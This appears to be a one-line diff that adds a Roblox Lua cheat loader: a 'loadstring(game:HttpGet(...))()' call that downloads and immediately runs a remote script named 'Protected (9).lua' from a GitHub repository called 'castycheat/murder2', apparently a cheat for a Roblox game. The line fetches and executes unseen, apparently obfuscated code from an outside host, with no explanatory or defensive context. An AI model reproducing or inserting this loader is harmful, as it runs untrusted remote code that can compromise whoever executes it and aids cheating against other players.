@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/castycheat/murder2/main/Protected%20(9).lua"))()
